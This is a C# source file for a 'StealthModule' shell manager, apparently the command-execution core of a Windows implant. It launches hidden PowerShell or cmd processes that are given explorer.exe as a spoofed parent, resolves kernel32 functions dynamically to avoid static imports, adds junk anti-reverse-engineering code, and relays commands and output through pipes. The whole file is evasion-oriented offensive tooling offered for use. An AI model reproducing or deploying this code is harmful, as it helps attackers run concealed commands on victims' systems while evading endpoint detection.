using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace StealthModule
{
    /// <summary>
    /// Абсолютно неуязвимый менеджер shell с PPID spoofing и скрытыми пайпами
    /// </summary>
    public class ShellManager
    {
        #region Anti-RE & Junk
        private static void _Junk_Method_0x33(int depth)
        {
            if (depth <= 0) return;
            Random r = new Random();
            int x = r.Next(1, 100);
            if (x > 150) // Opaque predicate (never true)
            {
                Process.Start("calc.exe");
            }
            _Junk_Method_0x33(depth - 1);
        }
        #endregion

        #region Константы
        private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        private const uint CREATE_NO_WINDOW = 0x08000000;
        private static readonly IntPtr PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = (IntPtr)0x00020002;
        private const uint PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF;
        private const uint HANDLE_FLAG_INHERIT = 0x00000001;
        private const uint STARTF_USESTDHANDLES = 0x00000100;
        private const uint PIPE_TIMEOUT_MS = 30000; // 30 секунд
        private const int MAX_ERROR_COUNT = 5;
        #endregion

        #region Поля
        private static IntPtr _hProcess = IntPtr.Zero;
        private static IntPtr _hThread = IntPtr.Zero;
        private static IntPtr _hStdInWrite = IntPtr.Zero;
        private static IntPtr _hStdOutRead = IntPtr.Zero;
        private static ConcurrentQueue<string> _outputQueue = new ConcurrentQueue<string>();
        private static bool _isRunning = false;
        private static Thread _readingThread;
        private static readonly object _lock = new object();
        #endregion

        #region Структуры
        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }
        #endregion

        #region Dynamic Invoke (никаких DllImport!)
        private static class NativeApi
        {
            private static Dictionary<string, Delegate> _delegateCache = new Dictionary<string, Delegate>();
            private static Dictionary<string, IntPtr> _moduleCache = new Dictionary<string, IntPtr>();

            private static IntPtr GetModule(string name)
            {
                if (_moduleCache.ContainsKey(name)) return _moduleCache[name];
                IntPtr hMod = GetModuleHandleW(name);
                if (hMod == IntPtr.Zero) hMod = LoadLibraryW(name);
                _moduleCache[name] = hMod;
                return hMod;
            }

            private static T GetPInvoke<T>(string module, string function) where T : class
            {
                string key = module + "!" + function;
                if (_delegateCache.ContainsKey(key)) return _delegateCache[key] as T;
                IntPtr hModule = GetModule(module);
                IntPtr pFunc = GetProcAddress(hModule, function);
                if (pFunc == IntPtr.Zero) return null;
                var del = Marshal.GetDelegateForFunctionPointer(pFunc, typeof(T)) as T;
                _delegateCache[key] = del;
                return del;
            }

            [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
            private static extern IntPtr GetModuleHandleW(string lpModuleName);
            [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
            private static extern IntPtr LoadLibraryW(string lpFileName);
            [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

            public static T GetKernel32<T>(string func) where T : class { return GetPInvoke<T>("kernel32.dll", func); }
        }

        // Делегаты для WinAPI
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool CreatePipeDelegate(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);
        private static CreatePipeDelegate CreatePipe { get { return NativeApi.GetKernel32<CreatePipeDelegate>("CreatePipe"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool SetHandleInformationDelegate(IntPtr hObject, uint dwMask, uint dwFlags);
        private static SetHandleInformationDelegate SetHandleInformation { get { return NativeApi.GetKernel32<SetHandleInformationDelegate>("SetHandleInformation"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool CreateProcessDelegate(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        private static CreateProcessDelegate CreateProcess { get { return NativeApi.GetKernel32<CreateProcessDelegate>("CreateProcessW"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool InitializeProcThreadAttributeListDelegate(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
        private static InitializeProcThreadAttributeListDelegate InitializeProcThreadAttributeList { get { return NativeApi.GetKernel32<InitializeProcThreadAttributeListDelegate>("InitializeProcThreadAttributeList"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool UpdateProcThreadAttributeDelegate(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
        private static UpdateProcThreadAttributeDelegate UpdateProcThreadAttribute { get { return NativeApi.GetKernel32<UpdateProcThreadAttributeDelegate>("UpdateProcThreadAttribute"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr OpenProcessDelegate(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        private static OpenProcessDelegate OpenProcess { get { return NativeApi.GetKernel32<OpenProcessDelegate>("OpenProcess"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool ReadFileDelegate(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
        private static ReadFileDelegate ReadFile { get { return NativeApi.GetKernel32<ReadFileDelegate>("ReadFile"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool WriteFileDelegate(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
        private static WriteFileDelegate WriteFile { get { return NativeApi.GetKernel32<WriteFileDelegate>("WriteFile"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool CloseHandleDelegate(IntPtr hObject);
        private static CloseHandleDelegate CloseHandle { get { return NativeApi.GetKernel32<CloseHandleDelegate>("CloseHandle"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate uint WaitForSingleObjectDelegate(IntPtr hHandle, uint dwMilliseconds);
        private static WaitForSingleObjectDelegate WaitForSingleObject { get { return NativeApi.GetKernel32<WaitForSingleObjectDelegate>("WaitForSingleObject"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool TerminateProcessDelegate(IntPtr hProcess, uint uExitCode);
        private static TerminateProcessDelegate TerminateProcess { get { return NativeApi.GetKernel32<TerminateProcessDelegate>("TerminateProcess"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool PeekNamedPipeDelegate(IntPtr hNamedPipe, byte[] lpBuffer, uint nBufferSize, out uint lpBytesRead, out uint lpTotalBytesAvail, out uint lpBytesLeftThisMessage);
        private static PeekNamedPipeDelegate PeekNamedPipe { get { return NativeApi.GetKernel32<PeekNamedPipeDelegate>("PeekNamedPipe"); } }
        #endregion

        #region Логирование
        private static string LogPath = Path.Combine(Path.GetTempPath(), "shell_manager.log");

        private static void Log(string message)
        {
            try
            {
                File.AppendAllText(LogPath, string.Format("{0:HH:mm:ss.fff} | {1}\n", DateTime.Now, message));
            }
            catch { }
        }
        #endregion

        #region Основные методы
        /// <summary>
        /// Запускает shell (по умолчанию PowerShell) с PPID spoofing
        /// </summary>
        public static bool StartShell(string shellExe = null)
        {
            if (shellExe == null) shellExe = "powershell.exe";
            
            lock (_lock)
            {
                if (_isRunning)
                {
                    Log("[StartShell] Already running");
                    return true;
                }

                try
                {
                    Log(string.Format("[StartShell] Starting {0}", shellExe));
                    _outputQueue = new ConcurrentQueue<string>();

                    SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                    sa.nLength = Marshal.SizeOf(sa);
                    sa.bInheritHandle = true;
                    sa.lpSecurityDescriptor = IntPtr.Zero;

                    IntPtr hStdOutWrite, hStdInRead;

                    // Создаем пайпы для ввода/вывода
                    if (!CreatePipe(out _hStdOutRead, out hStdOutWrite, ref sa, 0))
                    {
                        Log("[StartShell] Failed to create stdout pipe");
                        return false;
                    }
                    SetHandleInformation(_hStdOutRead, HANDLE_FLAG_INHERIT, 0);

                    if (!CreatePipe(out hStdInRead, out _hStdInWrite, ref sa, 0))
                    {
                        Log("[StartShell] Failed to create stdin pipe");
                        CloseHandle(_hStdOutRead);
                        return false;
                    }
                    SetHandleInformation(_hStdInWrite, HANDLE_FLAG_INHERIT, 0);

                    // Получаем PID explorer.exe для PPID spoofing
                    uint parentPid = GetExplorerPid();
                    Log(string.Format("[StartShell] Parent PID: {0}", parentPid));

                    // Настраиваем STARTUPINFOEX
                    STARTUPINFOEX siex = new STARTUPINFOEX();
                    siex.StartupInfo.cb = (uint)Marshal.SizeOf(siex);
                    siex.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
                    siex.StartupInfo.hStdInput = hStdInRead;
                    siex.StartupInfo.hStdOutput = hStdOutWrite;
                    siex.StartupInfo.hStdError = hStdOutWrite;

                    // Инициализируем список атрибутов
                    IntPtr lpSize = IntPtr.Zero;
                    InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                    siex.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                    InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, ref lpSize);

                    // Устанавливаем атрибут родительского процесса
                    IntPtr parentHandle = OpenProcess(PROCESS_ALL_ACCESS, false, parentPid);
                    IntPtr lpParentHandle = Marshal.AllocHGlobal(IntPtr.Size);
                    Marshal.WriteIntPtr(lpParentHandle, parentHandle);
                    UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                        lpParentHandle, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                    // Формируем командную строку
                    string cmdLine = shellExe.ToLower().Contains("powershell")
                        ? string.Format("{0} -NoLogo -NoExit -Command -", shellExe)
                        : shellExe;

                    PROCESS_INFORMATION pi;
                    if (CreateProcess(null, cmdLine, IntPtr.Zero, IntPtr.Zero, true,
                        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siex, out pi))
                    {
                        _hProcess = pi.hProcess;
                        _hThread = pi.hThread;
                        _isRunning = true;

                        Log(string.Format("[StartShell] Process started: PID={0}", pi.dwProcessId));

                        // Закрываем ненужные handles
                        CloseHandle(hStdOutWrite);
                        CloseHandle(hStdInRead);

                        // Запускаем поток чтения
                        _readingThread = new Thread(ReadPipes) { IsBackground = true };
                        _readingThread.Start();

                        // Очистка
                        CloseHandle(parentHandle);
                        if (lpParentHandle != IntPtr.Zero) Marshal.FreeHGlobal(lpParentHandle);

                        return true;
                    }

                    // Ошибка создания процесса
                    Log(string.Format("[StartShell] CreateProcess failed: {0}", Marshal.GetLastWin32Error()));
                    if (lpParentHandle != IntPtr.Zero) Marshal.FreeHGlobal(lpParentHandle);
                    if (siex.lpAttributeList != IntPtr.Zero) Marshal.FreeHGlobal(siex.lpAttributeList);
                    CloseHandle(_hStdOutRead);
                    CloseHandle(_hStdInWrite);

                    return false;
                }
                catch (Exception ex)
                {
                    Log(string.Format("[StartShell] Exception: {0}", ex.Message));
                    _outputQueue.Enqueue(string.Format("Failed: {0}", ex.Message));
                    return false;
                }
            }
        }

        /// <summary>
        /// Отправляет команду в shell
        /// </summary>
        public static bool SendCommand(string command)
        {
            if (!_isRunning)
            {
                Log("[SendCommand] Shell not running");
                return false;
            }

            try
            {
                Log(string.Format("[SendCommand] >>> {0}", command));
                byte[] data = Encoding.UTF8.GetBytes(command + "\n");
                int offset = 0;

                while (offset < data.Length)
                {
                    uint chunkSize = (uint)Math.Min(4096, data.Length - offset);
                    uint written;

                    if (!WriteFile(_hStdInWrite, data, chunkSize, out written, IntPtr.Zero))
                    {
                        int error = Marshal.GetLastWin32Error();
                        Log(string.Format("[SendCommand] WriteFile error: {0}", error));
                        return false;
                    }

                    offset += (int)written;
                }

                return true;
            }
            catch (Exception ex)
            {
                Log(string.Format("[SendCommand] Exception: {0}", ex.Message));
                return false;
            }
        }

        /// <summary>
        /// Читает вывод из shell (накопленный)
        /// </summary>
        public static string ReadOutput()
        {
            StringBuilder sb = new StringBuilder();
            string line;

            while (_outputQueue.TryDequeue(out line))
            {
                sb.Append(line);
                if (sb.Length > 8000) break;
            }

            return sb.ToString();
        }

        /// <summary>
        /// Выполняет команду синхронно и возвращает результат
        /// </summary>
        public static string ExecuteCommand(string cmd, string shellExe = null)
        {
            if (shellExe == null) shellExe = "cmd.exe";
            Log(string.Format("[ExecuteCommand] {0} /c {1}", shellExe, cmd));

            IntPtr lpParentHandle = IntPtr.Zero;
            IntPtr parentHandle = IntPtr.Zero;
            IntPtr hRead = IntPtr.Zero;
            IntPtr hWrite = IntPtr.Zero;
            STARTUPINFOEX siex = new STARTUPINFOEX();

            try
            {
                uint parentPid = GetExplorerPid();

                SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                sa.nLength = Marshal.SizeOf(sa);
                sa.bInheritHandle = true;

                // Создаем пайп для вывода
                if (!CreatePipe(out hRead, out hWrite, ref sa, 0))
                {
                    Log("[ExecuteCommand] Failed to create pipe");
                    return "Error: Pipe creation failed";
                }
                SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

                // Настраиваем STARTUPINFOEX
                siex.StartupInfo.cb = (uint)Marshal.SizeOf(siex);
                siex.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
                siex.StartupInfo.hStdOutput = hWrite;
                siex.StartupInfo.hStdError = hWrite;

                IntPtr lpSize = IntPtr.Zero;
                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                siex.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, ref lpSize);

                parentHandle = OpenProcess(PROCESS_ALL_ACCESS, false, parentPid);
                lpParentHandle = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpParentHandle, parentHandle);
                UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpParentHandle, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                // Формируем командную строку
                string cmdLine = shellExe.ToLower().Contains("powershell")
                    ? string.Format("{0} -Command \"{1}\"", shellExe, cmd)
                    : string.Format("{0} /c \"{1}\"", shellExe, cmd);

                PROCESS_INFORMATION pi;
                if (CreateProcess(null, cmdLine, IntPtr.Zero, IntPtr.Zero, true,
                    EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siex, out pi))
                {
                    CloseHandle(hWrite);
                    hWrite = IntPtr.Zero;

                    // Читаем вывод
                    StringBuilder output = new StringBuilder();
                    byte[] buffer = new byte[4096];
                    uint bytesRead;
                    DateTime start = DateTime.Now;

                    while ((DateTime.Now - start).TotalMilliseconds < PIPE_TIMEOUT_MS)
                    {
                        uint totalAvail;
                        uint discard1, discard2;

                        if (PeekNamedPipe(hRead, null, 0, out discard1, out totalAvail, out discard2) && totalAvail > 0)
                        {
                            if (ReadFile(hRead, buffer, (uint)buffer.Length, out bytesRead, IntPtr.Zero) && bytesRead > 0)
                            {
                                output.Append(Encoding.UTF8.GetString(buffer, 0, (int)bytesRead));
                                start = DateTime.Now; // Сброс таймера
                            }
                        }
                        else
                        {
                            if (WaitForSingleObject(pi.hProcess, 50) == 0) // Процесс завершился
                            {
                                // Последняя проверка
                                if (PeekNamedPipe(hRead, null, 0, out discard1, out totalAvail, out discard2) && totalAvail > 0)
                                {
                                    ReadFile(hRead, buffer, (uint)buffer.Length, out bytesRead, IntPtr.Zero);
                                    output.Append(Encoding.UTF8.GetString(buffer, 0, (int)bytesRead));
                                }
                                break;
                            }
                        }
                    }

                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    CloseHandle(hRead);
                    hRead = IntPtr.Zero;

                    string result = output.ToString();
                    Log(string.Format("[ExecuteCommand] Result length: {0} chars", result.Length));
                    return result;
                }

                Log("[ExecuteCommand] CreateProcess failed");
                return "Error: CreateProcess failed";
            }
            catch (Exception ex)
            {
                Log(string.Format("[ExecuteCommand] Exception: {0}", ex.Message));
                return string.Format("Error: {0}", ex.Message);
            }
            finally
            {
                if (hWrite != IntPtr.Zero) CloseHandle(hWrite);
                if (hRead != IntPtr.Zero) CloseHandle(hRead);
                if (parentHandle != IntPtr.Zero) CloseHandle(parentHandle);
                if (lpParentHandle != IntPtr.Zero) Marshal.FreeHGlobal(lpParentHandle);
                if (siex.lpAttributeList != IntPtr.Zero) Marshal.FreeHGlobal(siex.lpAttributeList);
            }
        }

        /// <summary>
        /// Останавливает shell
        /// </summary>
        public static void StopShell()
        {
            lock (_lock)
            {
                Log("[StopShell] Stopping shell");
                _isRunning = false;

                if (_hProcess != IntPtr.Zero)
                {
                    TerminateProcess(_hProcess, 0);
                    CloseHandle(_hProcess);
                    CloseHandle(_hThread);
                    _hProcess = IntPtr.Zero;
                }

                if (_hStdOutRead != IntPtr.Zero)
                {
                    CloseHandle(_hStdOutRead);
                    _hStdOutRead = IntPtr.Zero;
                }

                if (_hStdInWrite != IntPtr.Zero)
                {
                    CloseHandle(_hStdInWrite);
                    _hStdInWrite = IntPtr.Zero;
                }

                Log("[StopShell] Stopped");
            }
        }

        /// <summary>
        /// Проверяет, работает ли shell
        /// </summary>
        public static bool IsRunning()
        {
            if (!_isRunning) return false;
            if (_hProcess == IntPtr.Zero) return false;

            // WAIT_TIMEOUT (258) значит процесс жив
            return WaitForSingleObject(_hProcess, 0) == 258;
        }
        #endregion

        #region Вспомогательные методы
        private static uint GetExplorerPid()
        {
            try
            {
                foreach (Process p in Process.GetProcessesByName("explorer"))
                {
                    return (uint)p.Id;
                }
            }
            catch { }

            return (uint)Process.GetCurrentProcess().Id;
        }

        private static void ReadPipes()
        {
            byte[] buffer = new byte[8192];
            uint bytesRead;
            int errorCount = 0;
            DateTime lastActivity = DateTime.Now;

            Log("[ReadPipes] Reader thread started");

            while (_isRunning && errorCount < MAX_ERROR_COUNT)
            {
                try
                {
                    // Проверка таймаута (если нет активности 30 секунд)
                    if ((DateTime.Now - lastActivity).TotalSeconds > 30)
                    {
                        Log("[ReadPipes] Timeout, stopping reader");
                        break;
                    }

                    uint totalAvail;
                    uint discard1, discard2;

                    if (PeekNamedPipe(_hStdOutRead, null, 0, out discard1, out totalAvail, out discard2) && totalAvail > 0)
                    {
                        if (ReadFile(_hStdOutRead, buffer, (uint)buffer.Length, out bytesRead, IntPtr.Zero) && bytesRead > 0)
                        {
                            string data = Encoding.UTF8.GetString(buffer, 0, (int)bytesRead);
                            _outputQueue.Enqueue(data);
                            errorCount = 0;
                            lastActivity = DateTime.Now;
                        }
                        else
                        {
                            int error = Marshal.GetLastWin32Error();
                            if (error == 109) // ERROR_BROKEN_PIPE
                            {
                                Log("[ReadPipes] Broken pipe detected");
                                break;
                            }
                            errorCount++;
                            Thread.Sleep(100);
                        }
                    }
                    else
                    {
                        Thread.Sleep(50);

                        // Проверка, жив ли процесс
                        if (_hProcess != IntPtr.Zero && WaitForSingleObject(_hProcess, 0) == 0)
                        {
                            Log("[ReadPipes] Process terminated");
                            break;
                        }
                    }
                }
                catch (Exception ex)
                {
                    Log(string.Format("[ReadPipes] Exception: {0}", ex.Message));
                    errorCount++;
                }
            }

            _isRunning = false;
            Log("[ReadPipes] Reader thread stopped");
        }
        #endregion
    }
}